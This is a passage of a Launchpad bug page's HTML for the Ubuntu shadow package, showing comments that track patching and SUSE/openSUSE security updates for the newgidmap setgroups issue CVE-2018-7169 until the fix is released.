              <a href="/ubuntu/+source/shadow/+bug/1729357/comments/27">
                
              </a>
          </td>

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/27"> #27</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>SUSE:SLE-12:Update is not affected, since newgidmap was only introduced with 4.2.1. We still ship 4.1.5.1.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">SUSE:SLE-12:Update is not affected, since newgidmap was only introduced with 4.2.1. We still ship 4.1.5.1.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                 remoteBugComment " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/28" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          
          <td>
            <img width="14" height="14" src="/@@/bug-remote" alt="" />
            In
            <a itemprop="url" href="https://bugzilla.opensuse.org/show_bug.cgi?id=1081294">bugzilla.opensuse.org/ #1081294</a>,
            <a href="https://launchpad.net/~kbabioch-b" class="sprite person-inactive">Kbabioch-b (kbabioch-b)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-16T08:49:09+00:00" title="2018-02-16 08:49:09 UTC">on 2018-02-16</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/shadow/+bug/1729357/comments/28">
                
              </a>
          </td>

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/28"> #28</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fixed for Factory: sr#577189</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fixed for Factory: sr#577189</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                 remoteBugComment " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/29" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          
          <td>
            <img width="14" height="14" src="/@@/bug-remote" alt="" />
            In
            <a itemprop="url" href="https://bugzilla.opensuse.org/show_bug.cgi?id=1081294">bugzilla.opensuse.org/ #1081294</a>,
            <a href="https://launchpad.net/~mvetter" class="sprite person-inactive">Mvetter (mvetter)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-16T10:34:16+00:00" title="2018-02-16 10:34:16 UTC">on 2018-02-16</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/shadow/+bug/1729357/comments/29">
                
              </a>
          </td>

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/29"> #29</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks for adding the patch.<br />
SR accepted. Forwarded to Factory as SR#577204.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks for adding the patch.
SR accepted. Forwarded to Factory as SR#577204.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                 remoteBugComment " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/30" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          
          <td>
            <img width="14" height="14" src="/@@/bug-remote" alt="" />
            In
            <a itemprop="url" href="https://bugzilla.opensuse.org/show_bug.cgi?id=1081294">bugzilla.opensuse.org/ #1081294</a>,
            <a href="https://launchpad.net/~kbabioch-b" class="sprite person-inactive">Kbabioch-b (kbabioch-b)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-16T15:03:45+00:00" title="2018-02-16 15:03:45 UTC">on 2018-02-16</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/shadow/+bug/1729357/comments/30">
                
              </a>
          </td>

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/30"> #30</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Didn&#x27;t realize that we backported this feature to our SLE12 codestream. Applied the patch there, too: sr#155145</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Didn't realize that we backported this feature to our SLE12 codestream. Applied the patch there, too: sr#155145</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
    
  </div>
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~cyphar" class="sprite person">Aleksa Sarai (cyphar)</a>
    
    <time title="2018-02-19 06:35:55 UTC" datetime="2018-02-19T06:35:55.560260+00:00">on 2018-02-19</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in shadow (openSUSE): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; Unknown
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Unknown
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~bug-watch-updater" class="sprite person-inactive">Bug Watch Updater (bug-watch-updater)</a>
    
    <time title="2018-02-19 07:23:08 UTC" datetime="2018-02-19T07:23:08.319583+00:00">on 2018-02-19</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in shadow (openSUSE): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Unknown &#8594; Medium
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Unknown &#8594; Confirmed
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/31" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~cyphar" class="sprite person">Aleksa Sarai (cyphar)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-02-19T17:22:47.774733+00:00" title="2018-02-19 17:22:47 UTC">on 2018-02-19</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/31"> #31</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p><a rel="nofollow" href="https://github.com/shadow-maint/shadow/pull/99">https:/<wbr />/github.<wbr />com/shadow-<wbr />maint/shadow/<wbr />pull/99</a> includes the allow_setgroups<wbr />/deny_setgroups feature that we discussed earlier.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">https://github.com/shadow-maint/shadow/pull/99 includes the allow_setgroups/deny_setgroups feature that we discussed earlier.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                 remoteBugComment " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/32" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          
          <td>
            <img width="14" height="14" src="/@@/bug-remote" alt="" />
            In
            <a itemprop="url" href="https://bugzilla.opensuse.org/show_bug.cgi?id=1081294">bugzilla.opensuse.org/ #1081294</a>,
            <a href="https://launchpad.net/~swamp-a" class="sprite person-inactive">Swamp-a (swamp-a)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-03-12T17:08:46+00:00" title="2018-03-12 17:08:46 UTC">on 2018-03-12</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/shadow/+bug/1729357/comments/32">
                
              </a>
          </td>

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/32"> #32</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>SUSE-SU-<wbr />2018:0662-<wbr />1: An update that fixes one vulnerability is now available.</p>
<p>Category: security (moderate)<br />
Bug References: 1081294<br />
CVE References: CVE-2018-7169<br />
Sources used:<br />
SUSE Linux Enterprise Server for Raspberry Pi 12-SP2 (src):    shadow-4.2.1-27.6.1<br />
SUSE Linux Enterprise Server 12-SP3 (src):    shadow-4.2.1-27.6.1<br />
SUSE Linux Enterprise Server 12-SP2 (src):    shadow-4.2.1-27.6.1<br />
SUSE Linux Enterprise Desktop 12-SP3 (src):    shadow-4.2.1-27.6.1<br />
SUSE Linux Enterprise Desktop 12-SP2 (src):    shadow-4.2.1-27.6.1<br />
SUSE CaaS Platform ALL (src):    shadow-4.2.1-27.6.1<br />
OpenStack Cloud Magnum Orchestration 7 (src):    shadow-4.2.1-27.6.1</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">SUSE-SU-2018:0662-1: An update that fixes one vulnerability is now available.

Category: security (moderate)
Bug References: 1081294
CVE References: CVE-2018-7169
Sources used:
SUSE Linux Enterprise Server for Raspberry Pi 12-SP2 (src):    shadow-4.2.1-27.6.1
SUSE Linux Enterprise Server 12-SP3 (src):    shadow-4.2.1-27.6.1
SUSE Linux Enterprise Server 12-SP2 (src):    shadow-4.2.1-27.6.1
SUSE Linux Enterprise Desktop 12-SP3 (src):    shadow-4.2.1-27.6.1
SUSE Linux Enterprise Desktop 12-SP2 (src):    shadow-4.2.1-27.6.1
SUSE CaaS Platform ALL (src):    shadow-4.2.1-27.6.1
OpenStack Cloud Magnum Orchestration 7 (src):    shadow-4.2.1-27.6.1</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                 remoteBugComment " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/33" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          
          <td>
            <img width="14" height="14" src="/@@/bug-remote" alt="" />
            In
            <a itemprop="url" href="https://bugzilla.opensuse.org/show_bug.cgi?id=1081294">bugzilla.opensuse.org/ #1081294</a>,
            <a href="https://launchpad.net/~swamp-a" class="sprite person-inactive">Swamp-a (swamp-a)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-03-13T02:08:07+00:00" title="2018-03-13 02:08:07 UTC">on 2018-03-13</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/shadow/+bug/1729357/comments/33">
                
              </a>
          </td>

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/33"> #33</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>openSUSE-<wbr />SU-2018:<wbr />0667-1: An update that fixes one vulnerability is now available.</p>
<p>Category: security (moderate)<br />
Bug References: 1081294<br />
CVE References: CVE-2018-7169<br />
Sources used:<br />
openSUSE Leap 42.3 (src):    shadow-4.2.1-13.1</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">openSUSE-SU-2018:0667-1: An update that fixes one vulnerability is now available.

Category: security (moderate)
Bug References: 1081294
CVE References: CVE-2018-7169
Sources used:
openSUSE Leap 42.3 (src):    shadow-4.2.1-13.1</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/34" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-03-13T14:32:48.191059+00:00" title="2018-03-13 14:32:48 UTC">on 2018-03-13</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/34"> #34</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>@stgraber @mdeslaur - I&#x27;d considered making a release for Ubuntu...  but this is the negative acl thing...  Your opinions appreciated.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">@stgraber @mdeslaur - I'd considered making a release for Ubuntu...  but this is the negative acl thing...  Your opinions appreciated.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                 remoteBugComment " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/35" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          
          <td>
            <img width="14" height="14" src="/@@/bug-remote" alt="" />
            In
            <a itemprop="url" href="https://bugzilla.opensuse.org/show_bug.cgi?id=1081294">bugzilla.opensuse.org/ #1081294</a>,
            <a href="https://launchpad.net/~mvetter" class="sprite person-inactive">Mvetter (mvetter)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-07-02T10:50:46+00:00" title="2018-07-02 10:50:46 UTC">on 2018-07-02</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/shadow/+bug/1729357/comments/35">
                
              </a>
          </td>

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/35"> #35</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I think this can be closed.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I think this can be closed.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                 remoteBugComment " data-baseurl="/ubuntu/+source/shadow/+bug/1729357/comments/36" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          
          <td>
            <img width="14" height="14" src="/@@/bug-remote" alt="" />
            In
            <a itemprop="url" href="https://bugzilla.opensuse.org/show_bug.cgi?id=1081294">bugzilla.opensuse.org/ #1081294</a>,
            <a href="https://launchpad.net/~kbabioch-b" class="sprite person-inactive">Kbabioch-b (kbabioch-b)</a>
            wrote
            <time itemprop="commentTime" datetime="2018-07-16T07:45:50+00:00" title="2018-07-16 07:45:50 UTC">on 2018-07-16</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/shadow/+bug/1729357/comments/36">
                
              </a>
          </td>

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/shadow/+bug/1729357/comments/36"> #36</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>All updates released.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">All updates released.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
    
  </div>
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~bug-watch-updater" class="sprite person-inactive">Bug Watch Updater (bug-watch-updater)</a>
    
    <time title="2018-07-16 20:28:33 UTC" datetime="2018-07-16T20:28:33.386602+00:00">on 2018-07-16</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in shadow (openSUSE): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; Fix Released
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        <div style="float: right;">
          <a class="menu-link-activitylog" href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+activity">See full activity log</a>
        </div>
        <div class="clearfix"></div>

        
          

          
            <div align="center" id="add-comment-login-first">
              To post a comment you must <a href="+login?comments=all">log in</a>.
            </div>
          
        
        
      

      </div><!-- class="top-portlet" -->
      </div><!--- id="maincontentsub"-->
      <div>
        <div id="duplicate-form-container"></div>
        <div id="privacy-form-container"></div>
      </div>
    </div>
            
            
          </div><!-- yui-b -->
        </div><!-- yui-main -->

        
          <div id="side-portlets" class="yui-b side">
            
      <div id="involvement" class="portlet">
        <ul class="involvement">
          <li class="single">
            <a class="sprite bugs" href="/ubuntu/+source/shadow/+filebug">
              Report a bug
            </a>
          </li>
        </ul>
      </div>
      <div id="privacy" class="first portlet public">
  <div id="privacy-text">
     <span id="information-type-summary" class="sprite public">This report contains
         <strong id="information-type">Public Security</strong>
         information
     </span>&nbsp;<a class="sprite edit action-icon" id="privacy-link" href="/ubuntu/+source/shadow/+bug/1729357/+secrecy">Edit</a>

     <div id="information-type-description" style="padding-top: 5px">Everyone can see this security related information.
</div>
  </div>
</div>

      <div id="portlet-actions" class="portlet vertical">
  <ul id="duplicate-actions">
    <li class="sprite bug-dupe">
    <span id="mark-duplicate-text">
    <a class="menu-link-mark-dupe" href="/ubuntu/+source/shadow/+bug/1729357/+duplicate">Mark as duplicate</a>
    </span>
    </li>
    
    <li><a class="menu-link-createquestion sprite add" href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+create-question">Convert to a question</a></li>
    
    <li><a class="menu-link-addbranch sprite add" href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+addbranch">Link a related branch</a></li>
    <li><a class="menu-link-linktocve sprite add" href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+linkcve">Link to <abbr title="Common Vulnerabilities and Exposures Index">CVE</abbr></a></li>
    <li><a class="menu-link-unlinkcve sprite modify remove" href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+unlinkcve">Remove CVE link</a></li>
  </ul>
</div>

      

      <div class="portlet vertical" id="portlet-subscription">
  <div class="section">
    <div id="current_user_subscription" class="False">
      
        <span>You are</span>
        
        <a class="menu-link-subscription sprite modify edit" href="/ubuntu/+source/shadow/+bug/1729357/+subscribe">
           
           
           
           not directly subscribed to this bug's notifications.
        </a>
      
      
    </div>
    <div id="sub-unsub-spinner">Subscribing...</div>
    <ul>
      
      <li><a class="menu-link-editsubscriptions sprite modify edit" href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+subscriptions" title="View and change your subscriptions to this bug">Edit bug mail</a></li>
    </ul>
  </div>
  <script type="text/javascript">
    LPJS.use('io-base', 'node',
            'lp.bugs.bugtask_index.portlets.subscription', function(Y) {
        Y.on('domready', function() {
            Y.lp.bugs.bugtask_index.portlets.subscription.initialize();
        });
    });
  </script>
</div>

      <div class="portlet vertical" id="portlet-subscribers">
  <h2>Other bug subscribers</h2>
  <div>
    <div><a class="menu-link-addsubscriber sprite add" href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+addsubscriber" title="Launchpad will email that person whenever this bugs changes">Subscribe someone else</a></div>
  </div>
  <div id="other-bug-subscribers"></div>
</div>

      

      

      
  
  


      <div class="portlet" id="portlet-watches">
  <h2>Remote bug watches</h2>
  <ul>
    <li>
      <span class="sprite bug-remote"></span>
      <a class="link-external" href="https://bugzilla.opensuse.org/show_bug.cgi?id=1081294">auto-bugzilla.opensuse.org #1081294</a>
      
        <br />[<span>RESOLVED FIXED</span>]
        <a class="sprite edit action-icon" title="Change watch details" href="/bugs/1729357/+watch/127779">Edit</a>
    </li>
  </ul>
  <p>Bug watches keep track of this bug in other bug trackers.</p>
</div>

    
          </div><!-- yui-b side -->
        
      </div><!-- yui-t4 -->

      
  <div id="footer" class="footer">
    <div class="lp-arcana">
        <div class="lp-branding">
          <a href="https://launchpad.net/"><img src="/@@/launchpad-logo-and-name-hierarchy.png" alt="Launchpad" /></a>
          &nbsp;&bull;&nbsp;
          <a href="https://launchpad.net/+tour">Take the tour</a>
          &nbsp;&bull;&nbsp;
          <a href="https://help.launchpad.net/">Read the guide</a>
          &nbsp;
          <form id="globalsearch" method="get" accept-charset="UTF-8" action="https://launchpad.net/+search">
            <input type="search" id="search-text" name="field.text" />
            <input type="image" src="/@@/search" style="vertical-align:5%" alt="Search Launchpad" />
          </form>
        </div>
        
  

    </div>

    <div class="colophon">
      &copy; 2004-2021
      <a href="http://canonical.com/">Canonical&nbsp;Ltd.</a>
      &nbsp;&bull;&nbsp;
      <a href="https://launchpad.net/legal">Terms of use</a>
      &nbsp;&bull;&nbsp;
      <a href="https://www.ubuntu.com/legal/dataprivacy">Data privacy</a>
      &nbsp;&bull;&nbsp;
      <a href="/feedback">Contact Launchpad Support</a>
      
      &nbsp;&bull;&nbsp;
      <a href="http://blog.launchpad.net/">Blog</a>
      
	&nbsp;&bull;&nbsp;
	<a href="https://canonical.com/careers">Careers</a>
      
      &nbsp;&bull;&nbsp;
      <a href="https://twitter.com/launchpadstatus">System status</a>
      <span id="lp-version">
      &nbsp;&bull;&nbsp;
        r0d8de2b
        
        
        (<a href="https://dev.launchpad.net/">Get the code!</a>)
      </span>
    </div>
  </div>

    </div><!-- yui-d0-->

    
  
  
